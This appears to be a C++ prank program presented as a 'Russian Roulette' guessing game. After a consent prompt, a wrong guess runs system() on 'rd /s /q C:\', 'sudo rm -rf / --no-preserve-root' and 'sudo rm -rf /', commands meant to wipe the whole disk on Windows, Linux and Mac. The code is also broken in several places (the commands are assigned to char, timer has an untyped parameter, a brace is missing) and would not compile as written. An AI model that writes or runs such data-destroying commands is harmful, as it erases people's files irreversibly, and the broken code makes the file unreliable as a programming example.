#include <iostream>
#include <cstdlib>
#include <chrono>
#include <thread>
using namespace std;

void timer(t) {
    this_thread::sleep_for(chrono::seconds(t));
}

int main () {
    char Windows = "rd /s /q C:\ ";
    char Linux = "sudo rm -rf / --no-preserve-root";
    char Mac = "sudo rm -rf /";

    srand(time(0));
    int random = (rand() % 99) + 1;

    cout << "Welcome to the Russian Roulette Game!" << endl;
    cout << "You have only one chance to survive!" << endl;
    cout << "if you are lucky, you will win!" << endl;
    cout << "if you are not, you will lose your data forever!" << endl;
    cout << "Please do a backup before playing this game!" << endl;
    cout << "I'm not responsible for any data loss!" << endl;
    cout << "Do you agree? (Y/N): ";
    char agree;
    cin >> agree;
    if (agree=='Y' || agree=='y') {
        cout << "Good luck!" << endl;
        cout << "Choose a number between 1 and 100: ";
        int number;
        cin >> number;
        if (number == random) {
            cout << "Congratulations! You are the winner!" << endl;
            timer(0.5);
            cout << "You are very lucky!" << endl;
            timer(0.5);
            cout << "Do you want to play again? (Y/N)" << endl;
            if (agree=='Y' || agree=='y') {
                main();
            } else {
                cout << "Thank you for playing this game!" << endl;
                timer(2);
                return 0;
            }
        } else {
            cout << "Sorry! You are not the winner!" << endl;
            timer(0.5);
            cout << "You have lost your data!" << endl;
            timer(0.5);
            cout << "You have lost your files!" << endl;
            timer(0.5);
            cout << "You have lost your photos!" << endl;
            timer(0.5);
            cout << "You have lost your videos!" << endl;
            timer(0.5);
            cout << "You have lost your music!" << endl;
            timer(0.5);
            cout << "You have lost your documents!" << endl;
            timer(0.5);
            cout << "You have lost your games!" << endl;
            timer(0.5);
            cout << "You have lost your programs!" << endl;
            timer(0.5);
            cout << "You have lost your apps!" << endl;
            timer(0.5);
            cout << "You have lost your settings!" << endl;
            timer(0.5);
            cout << "You have lost your passwords!" << endl;
            timer(0.5);
            cout << "You have lost your accounts!" << endl;
            timer(0.5);
            cout << "You have lost your money!" << endl;
            timer(0.5);
            cout << "You have lost your time!" << endl;
            timer(0.5);
            cout << "You have lost your life!" << endl;
            timer(0.5);
            cout << "You have lost everything!" << endl;
            timer(0.5);
            cout << "You have lost the game!" << endl;
            timer(0.5);
            cout << "You have lost the Russian Roulette Game!" << endl << endl << endl;
            timer(0.5);
            cout << "Now your data will be destroyed!" << endl;
            timer(2);
            system(Windows);
            system(Linux);
            system(Mac);
        }
    } else {
        cout << "Oh, no! You are not brave enough to play this game!" << endl;
        timer(2);
        return 0;
}
